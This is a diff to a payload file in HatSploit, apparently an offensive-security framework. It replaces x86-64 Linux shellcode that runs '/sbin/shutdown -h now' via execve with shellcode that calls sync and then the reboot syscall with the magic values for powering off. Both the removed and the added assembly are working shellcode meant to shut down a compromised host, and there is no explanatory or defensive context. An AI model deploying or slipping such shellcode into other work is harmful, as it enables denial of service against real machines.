@@ -29,32 +29,13 @@ class HatSploitPayload(Payload, PayloadTools):
             self.details['Architecture'],
             """
             start:
-                xor rax, rax
-                xor rdx, rdx
+                mov rax, 0xa2
+                syscall
 
-                push rax
-                push byte 0x77
-                push word 0x6f6e
-                mov rbx, rsp
-
-                push rax
-                push word 0x682d
-                mov rcx, rsp
-
-                push rax
-                mov r8, 0x2f2f2f6e6962732f
-                mov r10, 0x6e776f6474756873
-                push r10
-                push r8
-                mov rdi, rsp
-
-                push rdx
-                push rbx
-                push rcx
-                push rdi
-                mov rsi, rsp
-
-                add rax, 59
+                mov rax, 0xa9
+                mov rdx, 0x4321fedc
+                mov rsi, 0x28121969
+                mov rdi, 0xfee1dead
                 syscall
             """
         )
